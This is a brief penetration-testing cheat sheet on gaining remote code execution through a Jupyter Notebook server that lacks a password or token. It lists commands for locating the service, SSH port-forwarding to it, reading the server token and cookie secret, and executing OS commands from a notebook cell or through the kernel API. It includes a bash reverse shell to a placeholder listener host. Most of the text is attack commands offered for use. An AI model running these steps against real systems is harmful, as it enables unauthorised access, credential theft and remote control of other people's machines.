# Jupyter Notebook — Unauthenticated / Token-Less RCE

Jupyter Notebook running locally or accessible via port forward without a password/token gives direct Python code execution.

```bash
# Check if Jupyter is running internally
ss -tlnp | grep 8888
ps aux | grep jupyter

# Port-forward to access it
ssh -L 8888:127.0.0.1:8888 <USER>@<TARGET>
# Open http://127.0.0.1:8888 in browser

# If token is required but process running as a user you control:
# Read the token from the running process
ps aux | grep jupyter
cat ~/.local/share/jupyter/runtime/notebook_cookie_secret
jupyter notebook list  # shows running servers + tokens

# Execute OS commands from a notebook cell:
import os; os.system('id')
# OR:
import subprocess; subprocess.run(['bash','-c','bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'])
```

## Via API (no browser)

```bash
# List kernels
curl http://127.0.0.1:8888/api/kernels

# Create kernel
curl -X POST http://127.0.0.1:8888/api/kernels

# Execute code via WebSocket (use jupyter-client or manual ws)
# Simpler: create a notebook and run it via nbconvert
jupyter nbconvert --to notebook --execute malicious.ipynb
```
